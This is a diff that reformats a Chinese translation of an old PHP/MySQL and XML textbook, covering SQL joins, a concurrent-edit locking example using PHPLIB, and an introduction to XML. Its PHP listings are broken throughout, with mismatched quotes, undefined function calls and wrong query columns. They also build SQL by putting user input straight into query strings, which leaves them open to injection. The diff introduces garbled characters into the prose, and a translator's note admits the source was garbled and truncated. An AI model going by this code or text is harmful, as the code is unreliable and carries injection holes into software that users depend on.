-AND books_authors.key_authors = authors.key_authors
+    AND books_authors.key_authors = authors.key_authors
 GROUP BY books.book_title
 HAVING number_of_authors > 1
 ```
@@ -9400,23 +10766,23 @@ HAVING number_of_authors > 1
 ## 此 SQL 的结果为
 
 | book_title | number_of_authors |
-|---|---|---|
+|---|---|
 | The Death of Sleep | 2 |
 
 是否存在更高效的 SQL 语句来提供相同的信息？答案是“是的”。作者表对上述 SQL 语句贡献了什么信息？它仅被用于计算每本书关联了多少作者。然而，name 字段的值并不重要，可以改为计数 key_authors 字段：
 
 ```sql
 SELECT books.book_title,
-COUNT(books_authors.key_authors) AS number_of_authors
+    COUNT(books_authors.key_authors) AS number_of_authors
 FROM
-books_authors
-,books
+    books_authors,
+    books
 WHERE
-books_authors.key_books = books.key_books
+    books_authors.key_books = books.key_books
 GROUP BY
-books.book_title
+    books.book_title
 HAVING
-number_of_authors > 1
+    number_of_authors > 1
 ```
 
 此 SQL 语句执行得更快，因为只连接了两个表。
@@ -9439,30 +10805,26 @@ MySQL 手册第 7.12 节列出了它支持的七种连接。虽然你应该熟�
 
 ```sql
 SELECT
-books.book_title,
-COUNT(authors.author_name) AS number_of_authors
+    books.book_title,
+    COUNT(authors.author_name) AS number_of_authors
 FROM
-books
-,books_authors
-,authors
+    books,
+    books_authors,
+    authors
 WHERE
-books.key_books = books_authors.key_books
-AND books_authors.key_authors = authors.key_authors
+    books.key_books = books_authors.key_books
+    AND books_authors.key_authors = authors.key_authors
 GROUP BY
-books.book_title
+    books.book_title
 ```
 
 ## 此 SQL 的结果为
 
 | book_title | number_of_authors |
-|---|---|---|
+|---|---|
 | Eric Men at Arms Gnome Man's Land | 1 |
 | Inside-Outside | 1 |
 | The Death of Sleep | 2 |
-
-
-
-
 
 # 引用完整性
 
@@ -9512,12 +10874,13 @@ books.book_title
 
 ```sql
 SELECT
-  population
+    population
 FROM
-  states, businesses
+    states,
+    businesses
 WHERE
-  states.state_name = businesses.state_name
-  AND business.business_name = 'Red Hat Software, Inc.'
+    states.state_name = businesses.state_name
+    AND business.business_name = 'Red Hat Software, Inc.'
 ```
 
 你可以在 `select` 语句中添加任意数量 `join` 表达式。
@@ -9525,31 +10888,30 @@ WHERE
 
 ```sql
 CREATE TABLE
-  books_authors
-(
-  key_books_authors INT(5) not null AUTO_INCREMENT,
-  key_books INT(5) not null,
-  key_authors INT(5) not null,
-  PRIMARY KEY (key_books_authors)
-)
+    books_authors (
+        key_books_authors INT(5) NOT NULL AUTO_INCREMENT,
+        key_books INT(5) NOT NULL,
+        key_authors INT(5) NOT NULL,
+        PRIMARY KEY (key_books_authors)
+    )
 ```
 
 使用链接表的 SQL 可能是：
 
 ```sql
 SELECT
-  books.book_title,
-  authors.author_name,
-  publishers.publisher_name
+    books.book_title,
+    authors.author_name,
+    publishers.publisher_name
 FROM
-  books,
-  books_authors,
-  authors,
-  publishers
+    books,
+    books_authors,
+    authors,
+    publishers
 WHERE
-  books.key_books = books_authors.key_books
-  AND books_authors.key_authors = authors.key_authors
-  AND books.key_publishers = publishers.key_publishers
+    books.key_books = books_authors.key_books
+    AND books_authors.key_authors = authors.key_authors
+    AND books.key_publishers = publishers.key_publishers
 ```
 
 ## 总结
@@ -9582,29 +10944,24 @@ NULL 值非常重要，特别是当你执行统计任务时。但在我创建的
 
 ```sql
 CREATE TABLE
-  concurrent
-(
-  key_concurrent INT (5) not null AUTO_INCREMENT,
-  name VARCHAR (50) not null,
-  phone VARCHAR (50) not null,
-  dte_created datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
-  dte_updated datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
-  PRIMARY KEY (key_concurrent)
-)
+    concurrent (
+        key_concurrent INT(5) NOT NULL AUTO_INCREMENT,
+        name VARCHAR(50) NOT NULL,
+        phone VARCHAR(50) NOT NULL,
+        dte_created datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+        dte_updated datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+        PRIMARY KEY (key_concurrent)
+    )
 ```
 
 # 示例性应用程序
 
-列表 15.1 显示了一个允许用户添加、编辑和删除记录的应用程序。该应用程序允许两个人编辑同一条记录，导致了以下系列事件：
+列表 15.1 显示了一个允用户添加、编辑和删除记录的应用程序。该应用程序允许两个人编辑同一条记录，导致了以下系列事件：
 
 1. 用户 A 编辑 David Medinetets。
 2. 用户 B 编辑 David Medinetets。
 3. 用户 A 修改电话并保存了记录。此事件如图 15.1 所示。
 4. 用户 B 将名称更改为 David Mark Medinetets 并保存了记录。此事件导致 User A 所做的电话更改丢失。
-
-
-
-
 
 # 问题：一个用户可以覆盖另一个用户的更改
 
@@ -9618,273 +10975,464 @@ CREATE TABLE
 
 ```php
 <?php // concurrent01.php3
+
 $dbname = 'php_book';
+
 $hostname = 'localhost';
+
 $table_name = 'concurrent';
+
 $username = 'phpuser';
+
 $password = 'phpuser';
 
 $id_link = @mysql_connect($hostname, $username, $password);
 
 if (! $id_link) {
+
     echo '<head><title>Error</title></head><body>';
+
     echo 'Connection to PHP has failed.';
+
     echo '</body></html>';
+
     exit();
+
 }
 
 function affy_error_exit($msg) {
+
     $errno = mysql_errno();
+
     $error = mysql_error();
+
     echo '<html><head><title>Error</title></head><body>';
+
     echo $msg;
+
     echo "<br>Error ($errno) $error<br>";
+
     echo '</body></html>';
+
     exit();
+
 }
 
 // cet_display_form
+
 // Expected参数:
+
 // bgcolor - html 表的背景颜色。
+
 // next_action - 表单的 action 属性。
+
 // name - name 字段的值。
+
 // phone - phone 字段的值。
+
 // button - 提交按钮的文本。
 
 function cet_display_form($ary) {
+
     $key_value = $ary['key_value'];
+
     $next_action = $ary['next_action'];
+
     $bgcolor = $ary['bgcolor'];
+
     if (strlen($bgcolor)) {
+
         $bgcolor = 'lime';
+
     }
+
     echo '<table border="1" bgcolor="'.$bgcolor.'">';
+
     echo $bgcolor;
+
     echo '<tr><td><td cellpadding="5"><tr><td>';
+
     echo '<form action="index.php3" method="post">';
 
     echo '<input type="hidden" name="action">';
+
     echo ' value="'.$next_action.'">';
 
     echo '<input type="hidden" name="key_value">';
+
     echo ' value="'.$key_value.'">';
 
     echo 'Name: <input type="text" name="name" value=";
+
     echo $ary['name'];
+
     echo '<br>';
 
     echo 'Phone: <input type="text" name="phone" value=";
+
     echo $ary['phone'];
+
     echo '"<br><br>';
+
     echo '<center><input type="submit"';
+
     echo ' value=';
+
     echo $ary['button'];
+
     echo ' '</center>';
+
     echo '</form></td><td></td></tr></table><br>';
+
 }
 
 // cet_href
+
 //
+
 function cet_href($action, $text, $key_value) {
+
     echo '<font size="2" color="blue">';
+
     echo '<a href="$PHP_SELF?action=$action&key_value=$key_value">';
+
     echo "$text</a></font>';
+
 }
 
 // cet_insert
+
 //
+
 // Expected参数:
+
 // table_name - 数据库表名。
+
 // dbname - 数据库名。
+
 // id_link - 数据库的连接 ID。
+
 // name - name 字段的值。
+
 // phone - phone 字段的值。
 
 function cet_insert($table_name) {
+
     $table_name = $ary['table_name'];
+
     $dbname = $ary['dbname'];
+
     $id_link = $ary['id_link'];
+
     $name = $ary['name'];
+
     $phone = $ary['phone'];
+
     $current_date = date('Y-m-d H:i:s');
 
     $str_sql = "INSERT INTO $table_name (
+
         dte_created,
+
         dte_updated,
+
         name,
+
         phone
+
     ) VALUES (
+
         '$current_date',
+
         '$current_date',
+
         '$name',
+
         '$phone'
+
     )";
 
     $result = mysql_db_query($dbname, $str_sql, $id_link);
+
     if (!$result) {
+
         affy_error_exit("SQL Insert Execution has failed. <br><b>$str_sql</b>");
+
     }
+
 }
 
 // cet_update
+
 // Expected参数:
+
 // table__name - 数据库表名。
+
 // dbname - 数据库名。
+
 // id_link - 数据库的连接 ID。
+
 // key_value - 要更新的记录的 ID。
+
 // name - name 字段的值。
+
 // phone - phone 字段的值。
 
 function cet_update($ary) {
+
     $table_name = $ary['table_name'];
+
     $dbname = $ary['dbname'];
+
     $id_link = $ary['id_link'];
+
     $key_value = $ary['key_value'];
+
     $name = $ary['name'];
+
     $phone = $ary['phone'];
+
     $current_date = date('Y-m-d H:i:s');
 
     $str_sql = "UPDATE $table_name SET
+
         name = '$name',
+
         phone = '$phone',
+
         dte_updated = '$current_date'
+
     WHERE key_value = $key_value";
 
     $result = mysql_db_query($dbname, $str_sql, $id_link);
+
     if (!$result) {
+
         affy_error_exit("SQL Update Execution has failed. <br><b>$str_sql</b>");
+
     }
+
 }// Expected参数:
+
 // dbname - 数据库名。
+
 // table_name - 数据库名。
+
 // key_value - 记录的 key。
+
 // id_link - 数据库的连接 ID。
 
 function cet_read($ary) {
+
     $table_name = $ary['table_name'];
+
     $key_value = $ary['key_value'];
 
     $str_sql = "SELECT * FROM $table_name WHERE key_value = $key_value";
 
     $result = mysql_db_query($ary['dbname'], $str_sql, $ary['id_link']);
+
     if (!$result) {
+
         affy_error_exit("SQL Select failed. <br><b>$str_sql</b>");
+
     }
 
     $record = @mysql_fetch_object($result);
+
     return ($record);
+
 }// 所有的 PHP 函数都已定义。
+
 // 现在是执行操作并显示页面的时间。
+
 ?>
+
 <html><head><title>Concurrent Edit</title></head>
+
 <body>
+
 <h1>Concurrent Edit</h1>
 
 <?php// 处理删除操作。
+
 if ($request['action'] == 'delete') {
+
     $key_value = $request['key_value'];
 
     $str_sql = "DELETE FROM $table_name WHERE key_value = $key_value";
 
     $result = mysql_query($dbname, $str_sql, $id_link);
+
     if (!$result) {
+
         affy_error_exit("SQL Delete Execution has failed.<br><b>$str_sql</b>");
+
     }
 
     echo '<p>The record has been deleted.</p>';
+
     echo "<p><a href=\"PHP_SELF\">Here</a></p>";
+
     echo "<p>For Table Maintenance.</p>";
+
     exit();
+
 } // 处理更新操作。
+
 if ($request['action'] == 'update') {
+
     $record = set_update(array(
+
         dbname => $dbname,
+
         table_name => $table_name,
+
         id_link => $id_link,
+
         key_value => $request['key_value'],
+
         'name' => $request['name'],
+
         'phone' => $request['phone']
+
     ));
 
     echo '<p>The record has been updated.</p>';
+
     echo "<p><a href=\"PHP_SELF\">Here</a></p>";
+
     echo "<p>For Table Maintenance.</p>";
+
     exit();
+
 } // 处理编辑操作。
+
 if ($request['action'] == 'edit') {
+
     $record = set_read(array(
+
         dbname => $dbname,
+
         table_name => $table_name,
+
         key_value => $request['key_value'],
+
         id_link => $id_link
+
     ));
 
     cet_display_form(array(
+
         'key_value' => $request['key_value'],
+
         'name' => $record->name,
+
         'phone' => $record->phone,
+
         'bgcolor' => 'yellow',
+
         'button' => 'Save Changes',
+
         'next_action' => 'update'
+
     ));
+
     exit();
+
 } // 处理插入操作。
+
 if ($request['action'] == "insert") {
+
     c_insert(array(
+
         'table_name' => $table_name,
+
         dbname => $dbname,
+
         'id_link' => $id_link,
+
         'name' => $request['name'],
+
         'phone' => $request['phone']
+
     ));
 
     echo "<p>The record has been inserted.</p>";
+
     echo "<p><a href=\"PHP_SELF\">Here</a></p>";
+
     echo "<p>For Table Maintenance.</p>";
+
     exit();
+
 }
 
 $str_sql = "SELECT * FROM $table_name";
 
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (!$result) {
+
     affy_error_exit("SQL Select Execution has failed.<br><b>$str_sql</b>");
+
 }
 
 $number_of_records = @mysql_num_rows($result);
 
 // 显示表单，使用户可以始终添加
+
 // 记录。
+
 cet_display_form(array(
+
     "name" => "",
+
     "phone" => "",
+
     'next_action' => 'insert',
+
     'button' => 'Add a Record'
+
 ));
 
 if ($number_of_records < 1) {
+
     echo '<p>There are no records in this table.</p>';
+
 }else {
+
     echo '<table padding="5">';
+
     echo '<tr><th>Actions</th>';
+
     echo '<th>Name</th><th>Phone</th></tr>';
 
     for ($index = 0; $index < $number_of_records; $index++) {
+
         $record = @mysql_fetch_object($result);
+
         echo '<tr><td>'.cet_href('edit', 'Edit', $record->key_value).'</td>';
+
         echo '&nbsp;&nbsp;';
+
         echo '<td>'.cet_href('delete', 'Delete', $record->key_value).'</td>';
+
         echo '</td>';
+
         printf('<td>%s</td>',', $record->name);
+
         printf('<td>%s</td>',', $record->phone);
+
         echo '</tr>>';
+
     }
+
     echo '</table>';
+
 }
+
 ```
-
-
-
 
 # 解决方案：防止多用户编辑
 
@@ -9903,15 +11451,14 @@ PHPLIB 模块最大的优势之一在于你不需要知道会话实际上是如�
 让一次仅有一个用户编辑记录的一种方法是将编辑者的姓名插入到正在编辑的记录中。例如，可以将 `concurrent` 表更改为：
 
 ```sql
-CREATE TABLE concurrent
-(
-key_concurrent INT (5) not null AUTO_INCREMENT
-,editor VARCHAR (50) not null
-,name VARCHAR (50) not null
-,phone VARCHAR (50) not null
-dte_created datetime DEFAULT '0000-00-00 00:00:00' NOT NULL
-,dte_updated datetime DEFAULT '0000-00-00 00:00:00' NOT NULL
-PRIMARY KEY (key_concurrent)
+CREATE TABLE concurrent (
+    key_concurrent INT (5) not null AUTO_INCREMENT,
+    editor VARCHAR (50) not null,
+    name VARCHAR (50) not null,
+    phone VARCHAR (50) not null,
+    dte_created datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+    dte_updated datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+    PRIMARY KEY (key_concurrent)
 )
 ```
 
@@ -9923,12 +11470,12 @@ PRIMARY KEY (key_concurrent)
 
 ```sql
 CREATE TABLE locks (
-key_locks INT (5) not null AUTO_INCREMENT
-table_name VARCHAR (50) not null
-user_name VARCHAR (50) not null
-record_key INT (5) not null
-dte_created datetime DEFAULT '0000-00-00 00:00:00' NOT NULL
-PRIMARY KEY (key_locks)
+    key_locks INT (5) not null AUTO_INCREMENT,
+    table_name VARCHAR (50) not null,
+    user_name VARCHAR (50) not null,
+    record_key INT (5) not null,
+    dte_created datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+    PRIMARY KEY (key_locks)
 )
 ```
 
@@ -9940,7 +11487,7 @@ PRIMARY KEY (key_locks)
 
 # 设计解决方案
 
-现在已经决定了存储用户信息（以锁的形式）的技术，还需要做什么呢？
+现在已经决定了存�用户信息（以锁的形式）的技术，还需要做什么呢？
 
 - 当用户加载 Web 页面时，他们需要登录并分配会话——PHPLIB 可以处理这一点。
 - 当编辑记录时，需要更新 `locks` 表——这部分代码需要编写。
@@ -9960,10 +11507,6 @@ PRIMARY KEY (key_locks)
 
 *(注：由于提供的原文文本中间包含大量乱码和重复的示例片段，根据指令中“不要重复输出原文”的原则，译文已对逻辑部分进行了整合和翻译，并在乱码起始处合理结束。)*
 
-
-
-
-
 ```php
 // 如果 user_name 字段有长度，则
 // 记录被锁定。
@@ -9972,41 +11515,60 @@ $locked = strlen($db->f('user_name'));
 
 ```php
 echo '<tr><td align="right">';
+
 ```
 
 ```php
 // 如果记录未锁定，则显示编辑
 // 和删除选项。
 if (!$locked) {
+
     cet_href('edit', '编辑', $db->f('key_concurrent'));
+
     echo '&nbsp;
+
     cet_href('delete', '删除', $db->f('key_concurrent'));
+
 }
+
 echo '</td></tr>';
+
 ```
 
 ```php
 // 显示记录的字段。
 printf('<td>%s</td>', $db->f('name'));
+
 printf('<td>%s</td>', $db->f('phone'));
+
 ```
 
 ```php
 // 只有在记录被
 // 锁定时，才显示锁定信息。
 if ($locked) {
+
     printf('<td>%s at %s</td>',
+
     $db->f('user_name'),
+
     $db->f('dte_created'));
+
 } else {
+
     echo '<td>&nbsp;</td>';
+
 }
+
 echo '</tr>';
+
 ```
 
 ```php
 echo '</table>';
+
 echo '</body></html>';
+
 ```
 
 page_close();
@@ -10015,299 +11577,489 @@ page_close();
 
 ```php
 <?php // concurrent.inc
+
 // cet_display_form
+
 ```
 
 ## 解决方案：防止多用户编辑
 
 ```php
 // 预期参数：
+
 // bgcolor - html 表格的背景颜色。
+
 // next_action - 表单的 action 属性。
+
 // name - name 字段的值。
+
 // phone - phone 字段的值。
+
 // button - 提交按钮的文本。
 
 function cet_display_form($ary) {
+
     global $PHP_SELF;
 
     $key_value = $ary['key_value'];
+
     $next_action = $ary['next_action'];
+
     $bgcolor = $ary['bgcolor'];
+
     if (!strlen($bgcolor)) {
+
         $bgcolor = 'lime';
+
     }
 
     echo '<table border="1" bgcolor="' . $bgcolor . '">';
+
     echo $bgcolor;
+
     echo ' cellpadding="5"><<tr><td>';
+
     printf('<form action="%s" method="post">', $PHP_SELF);
 
     echo '<input type="hidden" name="action" value="' . $next_action . '">';
+
     echo '<input type="hidden" name="key_value" value="' . $key_value . '">';
 
     echo 'Name: <input type="text" name="name" value="' . $ary['name'] . '">';
+
     echo '</br>';
+
     echo 'Phone: <input type="text" name="phone" value="' . $ary['phone'] . '">';
+
     echo '</br><br>';
+
     echo '<center><input type="submit" value="' . $ary['button'] . '">';
+
     echo '</center>';
+
     echo '</form>';
+
     echo '</table>';
 
 // 取消按钮是可选的，因为添加表单
-// 不需要它们。
-if (isset($ary['cancel_button'])) {
-    printf('<form action="%s" method="post">', $PHP_SELF);
-    echo '<input type="hidden" name="action" value="cancel_edit">';
-    echo '<input type="hidden" name="key_value" value="' . $ary['key_value'] . '">';
-    echo 'value="$key_value">';
-    echo '<input type="submit" value="Cancel">';
-    echo '</form>';
-    echo '</center></td></tr></table><br>';
-}
 
+// 不需要它们。
+
+if (isset($ary['cancel_button'])) {
+
+    printf('<form action="%s" method="post">', $PHP_SELF);
+
+    echo '<input type="hidden" name="action" value="cancel_edit">';
+
+    echo '<input type="hidden" name="key_value" value="' . $ary['key_value'] . '">';
+
+    echo 'value="$key_value">';
+
+    echo '<input type="submit" value="Cancel">';
+
+    echo '</form>';
+
+    echo '</center></td></tr></table><br>';
+
+}
 
 ```
 
 
 ```php
 // cet_href
+
 function cet_href($action, $text, $key_value) {
+
     global $PHP_SELF;
 
     echo '<font size="2" color="blue">';
+
     echo '<a href="'.$PHP_SELF.'?action=$action.'&key_value=$key_value.'">';
+
     echo $text;
+
     echo '</font>';
+
 }
 
 // cet_insert
+
 // 预期参数：
+
 // table_name - 数据库名。
+
 // dbname - 数据库名。
+
 // id_link - 连接 ID。
+
 // name - name 字段的值。
+
 // phone - phone 字段的值。
+
 function cet_insert($ary) {
+
     global $db;
 
     $table_name = $ary['table_name'];
+
     $dbname = $ary['dbname'];
+
     $id_link = $ary['id_link'];
+
     $name = $ary['name'];
+
     $phone = $ary['phone'];
+
     $current_date = date('Y-m-d H:i:s');
 
     $db->query("INSERT INTO
+
 $table_name
+
 (
+
 dte_created,
+
 dte_updated,
+
 name,
+
 phone
+
 ) VALUES (
+
 '$current_date',
+
 '$current_date',
+
 '$name',
+
 '$phone'
+
 );
 }
 
 // cet_update
+
 // 预期参数：
+
 // table_name - 表名。
+
 // dbname - 数据库名。
+
 // id_link - 数据库的连接 ID。
+
 // key_value - 要更新记录的 ID。
+
 // name - name 字段的值。
+
 // phone - phone 字段的值。
+
 function cet_update($ary) {
+
   global $db;
 
   $table_name = $ary['table_name'];
+
   $dbname = $ary['dbname'];
+
   $id_link = $ary['id_link'];
+
   $key_value = $ary['key_value'];
+
   $name = $ary['name'];
+
   $phone = $ary['phone'];
+
   $current_date = date('Y-m-d H:i:s');
 
   $db->query("UPDATE
+
 $table_name
+
 set
+
 name = '$name',
+
 phone = '$phone',
+
 dte_updated = '$current_date'
+
 where
+
 name = $key_value
+
 }}
 
 // 预期参数：
+
 // dbname - 数据库名。
+
 // table_name - 表名。
+
 // key_value - 记录的键。
+
 // id_link - 数据库连接 ID。
+
 function cet_read($ary) {
+
     global $db;
 
     $table_name = $ary['table_name'];
+
     $key_value = $ary['key_value'];
 
     $db->query("
+
         select *
+
         from $table_name
+
         where name = $key_value
+
     ");
 
     $db->next_record();
+
 }
 
 function do_delete_action() {
+
     global $arr_request;
+
     global $table_name;
+
     global $db;
+
     global $PHP_SELF;
 
     $key_value = $arr_request['key_value'];
 
     $db->query("
+
         delete from $table_name
+
         where name = $key_value
+
     ");
 
     echo '<p>记录已删除。</p>';
+
     echo "<p>点击 <a href='$PHP_SELF'>这里</a> 返回</p>";
+
     echo '继续表 维护。</p>';
+
     exit();
+
 }
 
 function do_update_action() {
+
     global $arr_request;
+
     global $table_name;
+
     global $db;
+
     global $PHP_SELF;
 
     $key_value = $arr_request['key_value'];
 
     // 如果锁定仍然设置。如果不是，
+
     // 显示错误消息。
+
     $db->query("
+
         select *
+
     from locks
+
     where
+
         table_name = '$table_name'
+
         and record_key = $key_value
+
     ");
 
     if ($db->num_rows() < 1) {
+
         echo '<p>错误：会话超时。</p>';
+
         echo '<p>点击 <a href="' . $PHP_SELF . '">这里</a> 返回</p>';
+
         echo '继续表 维护。</p>';
+
         exit();
+
     }
 
     $record = cet_update(array(
+
         'dbname' => $dbname,
+
         'table_name' => $table_name,
+
         'key_value' => $arr_request['key_value'],
+
         'name' => $arr_request['name'],
+
         'phone' => $arr_request['phone']
+
     ));
 
     echo '<p>记录已更新。</p>';
+
     echo '<p>点击 <a href="' . $PHP_SELF . '">这里</a> 返回</p>';
+
     echo '继续表 维护。</p>';
+
     exit();
+
 }
 
 function do_edit_action() {
+
     global $arr_request;
+
     global $table_name;
+
     global $key_value;
+
     global $PHP_SELF;
+
     global $db;
 
     $key_value = $arr_request['key_value'];
 
     cet_read(array(
+
         'dbname' => $dbname,
+
         'table_name' => $table_name,
+
         'key_value' => $key_value
+
     ));
 
     cet_display_form(array(
+
         'dbname' => $dbname,
+
         'table_name' => $table_name,
+
         'key_value' => $key_value,
+
         'name' => $arr_request['name'],
+
         'phone' => $arr_request['phone'],
+
         'button' => '保存更改',
+
         'bgcolor' => 'yellow',
+
         'cancel_button' => 'yes'
+
     ));
+
 }
+
 ```
 
 
 
 ```php
 var $Host = 'localhost';
+
 var $Database = 'php_book';
+
 var $User = 'user01';
+
 var $Password = '';
+
 ```
 
 ```php
 class phpbook_session extends Session {
+
     var $classname = 'phpbook_session';
 
     var $cookiename = '';
+
     var $magic = 'chocolate';
+
     var $mode = 'cookie';
+
     var $fallback_mode = 'get';
+
     var $lifetime = 0;
+
     var $database_class = 'phpbook_db';
+
     var $database_table = 'active_sessions';
+
     var $gc_probability = 5;
+
 }
+
 ```
 
 ```php
 class phpbook_user extends User {
+
     var $classname = "phpbook_user";
 
     var $magic = 'chocolate_chips';
+
     var $database_class = "phpbook_db";
+
     var $database_table = "active_sessions";
+
 }
+
 ```
 
 ```php
 class phpbook_auth extends Poe_Auth {
+
     var $classname = "phpbook_auth";
 
     var $database_class = "phpbook_db";
+
     var $database_table = "auth_user";
+
 }
+
 ```
 
 ```php
 page_open(array(
+
     'sess' => 'phpbook_session',
+
     'user' => 'phpbook_user',
+
     'auth' => 'phpbook_auth'
+
 ));
+
 ```
 
 ```php
 // 声明请求数组，它包含了
+
 // 基于 URL (get) 和 基于表单的 (post) 参数。
+
 $arr_request = array();
 
 // 将数组和表单参数移到
+
 // 请求数组中。覆盖 url
+
 // 参数。此外，所有的键都转换为
+
 // 小写。
 
 ## 总结
@@ -10359,9 +12111,13 @@ XML 旨在解决 HTML 中固有的某些问题，正如我们稍后看到的，�
 # 为什么用 XML？
 
 HTML 的美之处之一（也是它的缺点之一）是它是通用的。嗯，HTML 并不是。如现在所示，HTML 不适用主要有以下四个原因：
+
 - 它不适用于媒体
+
 - 它允许的灵活性太大
+
 - 它混合了结构和显示
+
 - 因为通用 HTML 标记是通用的，它并不要求，例如每个段落开头缩进或在段落末尾双倍行距。当你指定图像或表格左对齐时，浏览器自由决定页面的左边缘是正好在左边缘还是缩进几个像素。
 
 # 浏览器差异
@@ -10375,9 +12131,13 @@ HTML 的美之处之一（也是它的缺点之一）是它是通用的。嗯，
 ## 注意
 
 HTML 的美之处之一（也是它的缺点之一）是它是通用的。嗯，HTML 并不是。如现在所示，HTML 不适用主要有以下四个原因：
+
 - 它不适用于媒体
+
 - 它允许的灵活性太大
+
 - 它混合了结构和显示
+
 - 因为通用 HTML 标记是通用的，它并不要求，例如每个段落开头缩进或在段落末尾双倍行距。
 
 # 为什么用 XML？（继续）
@@ -10394,17 +12154,13 @@ if (count($HTTP_GET_VARS)) {
 
 HTML 的所有者——万网联盟联盟——多年来一直在针对设计师和用户需求尝试解决方案。他们提供了其他标签，例如 `<div>`，它们执行某些功能，但方式略有不同。
 
-
-
-
-
 # 为什么选择 XML？
 
 HTML 专门针对在计算机显示器上、在图形用户界面内进行显示进行了优化。这种针对特定媒介背后的内置假设包括：例如，如果文档过长无法在特定的显示器分辨率下显示，将通过滚动条来查看其余部分——它不像打印件那样具有固有的“到下一页”机制。当用户打印 Web 页面时，他们得到的不仅是页面真实内容的硬拷贝渲染，还有按钮、菜单和其他“外壳（chrome）”等图形和导航元素的渲染。由于带宽的考虑，单个长文档需要在 Web 上被拆分成多个“页面”（实际上是多个独立的 HTML 文档）以便在 Web 上使用，这反过来又使它们作为一个整体进行处理变得繁琐甚至无法实现。以此类推。
 
 # 数据交换中的不实用性
 
-假设你是一个计算机组件制造商。你在网络上向消费者零售产品，并通过目录向那些偏好这种格式的人群销售。你还向增值分销商（或 VARs）进行批发销售，并从几十家供应商处购买自己的材料和子组件；供应链中的所有其他环节都使用它们自己的技术——从开源到“行业标准”，再到专有技术——来存储和处理其公司数据。此外，当然还有，你公司内部的不同组织可能使用不同的工具：Microsoft Access、IBM DB2、Oracle、Java、Perl 以及逗号分隔的平文件等等。
+假设你是一个计算机组件制造商。你在网绚上向消费者零售产品，并通过目录向那些偏好这种格式的人群销售。你还向增值分销商（或 VARs）进行批发销售，并从几十家供应商处购买自己的材料和子组件；供应链中的所有其他环节都使用它们自己的技术——从开源到“行业标准”，再到专有技术——来存储和处理其公司数据。此外，当然还有，你公司内部的不同组织可能使用不同的工具：Microsoft Access、IBM DB2、Oracle、Java、Perl 以及逗号分隔的平文件等等。
 
 你为什么要为了几十种不同的目的，将所有这些数据存储在几十种不同的格式中呢？如果使用某种简单、易于处理的通用格式来处理它们不是更好吗……比如，像 HTML 那样？
 
@@ -10421,15 +12177,18 @@ HTML 专门针对在计算机显示器上、在图形用户界面内进行显示
 在进入细节之前，查看 XML 显然与 HTML 不是同一种野兽的一些通用方法可能会有所帮助。以下是简短列表：
 
 -   平衡标签——Web 浏览器对 HTML 标签的嵌套是出名的随意。如果一个开启标签 `<b>` 后面紧跟着一个开启标签 `<i>`，但闭合标签 `</b>` 在另一个闭合标签 `</i>` 之前出现，浏览器会高兴地忽略这两个标签的重叠范围。相比之下，XML 处理器会直接拒绝这种做法。
+
 -   无无关紧要的空白——HTML 将连续出现的空白符（空格、制表符、换行符）展平为单个空格。XML 的前提是文档作者意图将空白放在它所在的位置，因此将所有空白视为“有意义的”。（XML 处理器对这一点的坚持程度各异，而且正如本章后面解释的那样，也有方法可以覆盖这一正式要求）。
+
 -   大小写敏感——在标准的基于 HTML 的 Web 页面中，你可以根据自己的喜好和对使用 Shift 键的倾向，将标记代码写为大写、小写或混合大小。相反，XML 将 `<shopkeeper>` 这样的标签视为与 `<ShopKeeper>`、`<SHOPKEEPER>` 等完全不同的标签。
--   Unicode——如果你是美国、英国或澳大利亚的开发者，这可能对你来说不是什么大事，但在其他地方这非常重要。现在不仅是文档内容，甚至标记本身，也可以基于完整 Unicode 标准下可用的任何语言编码。虽然标记中使用的标点符号——`<`、`=`、`>` 等——仍保持标准，但 XML 开发者可以在他们的标签和属性名称中使用西里尔字母、汉字、希伯来语以及世界上几乎所有剩余的字符集。
+
+-   Unicode——如果你是美国、英国或澳大利亚的开发者，这可能对你来说不是什么大事，但在其他地方这非常重要。现在不仅是文档内容，甚至标记本身，也可以基于完整 Unicode 标准下可用的任何语言编码。虽然标记中使用的标点符号——`<`、`=`、`>` 等——仍保持标标准，但 XML 开发者可以在他们的标签和属性名称中使用西里尔字母、汉字、希伯来语以及世界上几乎所有剩余的字符集。
 
 # XML 解析器的角色
 
 XML 规范大量使用“XML 处理器”一词作为特定类型软件的同义词，这种软件读取 XML 文档、解释标签嵌套的合法性、可能归一化空白等：简而言之，就是解析器。（注意，在本章中，“XML 处理器”的使用相当松散。）
 
-HTML 软件当然也使用解析器。但由于 HTML 规范的松散，这些解析器的编写异常困难；例如，它们必须允许所有可能的嵌套不当或不平衡标签的变体。相反，XML 规范作者的一个传奇目标是：一个 XML 解析器所需的工作量不超过一个研究生工作几天的时间。
+HTML 软件当然也使用解析器。但由于 HTML 规范的松散，这些解析器的编写异常困难；例如，它们必须允所有可能的嵌套不当或不平衡标签的变体。相反，XML 规范作者的一个传奇目标是：一个 XML 解析器所需的工作量不超过一个研究生工作几天的时间。
 
 在现实世界中，情况并没有进展得那么完美，但事实仍然是，XML 更严格的规则极极地简化了软件开发者的生活。
 
@@ -10449,10 +12208,6 @@ HTML 软件当然也使用解析器。但由于 HTML 规范的松散，这些解
 
 在最高层分析上——仅仅通过肉眼评估——文档包含文本且仅包含文本。当然，这对于 HTML（以及 SGML）也是如此。
 
-
-
-
-
 ## 核心 XML
 
 ### 元素
@@ -10465,7 +12220,7 @@ HTML 软件当然也使用解析器。但由于 HTML 规范的松散，这些解
 
 注意，闭合标签导致了元素的嵌套不当；渲染斜体的标签 `</i>` 开始于渲染加粗标签 `<b>` 的范围内，但却渲染加粗标签（由闭合的 `</b>` 标识）的范围之外闭合。正如上文所述，HTML 浏览器接受这种写法；然而，XML 解析器会强烈报错并拒绝该文档。
 
-XML 还引入了空元素或空标签的概念。此类元素在其起始标签和结束标签之间不包含任何内容；它的“内容”可以被认为是构建在标签本身中的。HTML 中类似于 XML 空标签的示例有 `<br>`（换行标签）和 `<img>`（包含图形链接的标签）。在 XML 中，你可以通过两种方式之一编写空标签：
